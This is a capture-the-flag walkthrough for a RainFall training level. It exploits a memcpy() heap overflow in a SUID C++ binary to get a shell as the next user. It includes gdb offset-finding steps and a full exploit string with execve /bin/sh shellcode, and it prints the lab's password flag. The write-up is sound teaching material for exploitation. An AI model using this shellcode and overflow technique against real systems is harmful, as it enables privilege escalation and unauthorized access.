# Level 9

## Vulnerability

```memcpy()``` buffer overflow

## Context

We find a binary with owner bonus0 and SUID.
```
level9@RainFall:~$ ls -l
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
```
When run, it does nothing.
```
level9@RainFall:~$ ./level9
level9@RainFall:~$ ./level9 hi
level9@RainFall:~$ ./level9 oh hi
level9@RainFall:~$
```

## Solution

Giving one long argument causes a segfault. We find the maximum input is 108 characters before segfaulting.
```
level9@RainFall:~$ ./level9 $(python -c 'print "A" * 108')
level9@RainFall:~$ ./level9 $(python -c 'print "A" * 109')
Segmentation fault (core dumped)
```

Investigating with gdb, we find this binary is compiled from C++ source code. 5 functions of class ```N``` stand out.
```
(gdb) info functions
...
0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
...
```
### main() overview

Globally, ```main()``` initializes two instances (```n1``` & ```n2```) of class ```N``` which contain:
1. an annotation (string)
2. a number (int)

Then ```main()``` calls ```setAnnotation()``` which calls ```memcpy()```, copying ```argv[1]``` into a buffer ```n1->annotation```. ```memcpy()``` copies strlen(argv[1]) bytes, meaning we can easily overflow the buffer.

Finally ```main()``` adds ```n1``` + ```n2```.

### Route to solution

Can we simply (like previous levels) write our [malicious code which opens a shell](http://shell-storm.org/shellcode/files/shellcode-827.php) in buffer ```n1->annotation```, then overwrite EIP with the address of our malicious code? Unfortunately, using the following example and [this EIP offset tool](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/), we don't seem to be able to reach and overwrite EIP.
```
(gdb) run Aa0Aa1Aa2Aa3Aa4...
...
Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
```
However, because we created ```n2``` after ```n1``` on the heap, we can use the ```memcpy()``` overflow to overwrite both ```n1``` and ```n2```. So can we write our malicious code in ```n1``` then overwrite ```n2``` with the address of our malicious code, then have ```main()``` call our malicious code for us when it adds? Not quite so simple...

```main()``` accesses ```n1->annotation``` dereferenced twice (a pointer to a pointer to contents), so we overwrite ```n2``` with the address of a pointer to our malicious code.

### Find buffer address

We need to find the address of ```n1```. In gdb, in the main we find the instruction after the call to ```n1->setAnnotation()``` is ```*main+136```. Put a break point at ```*main+136```, and run with a 4 byte argument ("BUFF"). Displaying the memory at %eax we find our argument stored in the buffer at ```0x804a00c```
```
level9@RainFall:~$ gdb -q level9
...
(gdb) disas main
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax
...
(gdb) break *main+136
...
(gdb) run "BUFF"
...
(gdb) x/s $eax
0x804a00c:	 "BUFF"
```

### Find n2 offset

We need to find out how many bytes we write in ```n1``` before we overflow into ```n2```?

Lets run the binary with our a pattern string from our favorite [EIP offset tool](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) and make it segfault.

We can see ```n2``` corresponds to register ```eax``` at time of segfault.
```
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6A
Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6A

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) info register eax
eax            0x41366441	1094083649
```
Lets convert the contents of ```eax``` from hex to ascii with ```xxd```
```
>$ echo 0x41366441 | xxd -r -p | rev
Ad6A
```
Searching for ```Ad6A``` in the pattern string we find it starts at byte 109. This means we can overwrite ```n2``` from byte 109 of our exploit string.

### Build exploit string

So we build our exploit which will be copied to buffer address ```0x804a00c```:
1. address of malicious code (part 2) - ```\x10\xa0\x04\x08```
2. malicious code which opens a shell - ```\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80```
3. buffer until we reach ```n2``` - ```"A" * 76```
4. address of address of malicious code (part 1) - ```\x0c\xa0\04\x08```

```
level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

## Recreate Exploited Binary

As user ```bonus0```, in ```/tmp```, create and compile ```level9_source.cpp```
```
bonus0@RainFall:/tmp$ g++ level9_source.cpp -fno-stack-protector -z execstack -o level9_source
```

Edit permissions including suid, then move the binary to home directory.
```
bonus0@RainFall:/tmp$ chmod u+s level9_source; chmod +wx ~; mv level9_source ~
```

Exit back to user ```level9```, then provide our exploit with updated addresses.
With the same method as above we find the buffer address ```0x0804b008```.
```
bonus0@RainFall:/tmp$ exit
exit
level9@RainFall:~$ /home/user/bonus0/level9_source $(python -c 'print "\x10\xb0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xb0\04\x08"')
$ whoami
bonus0
```
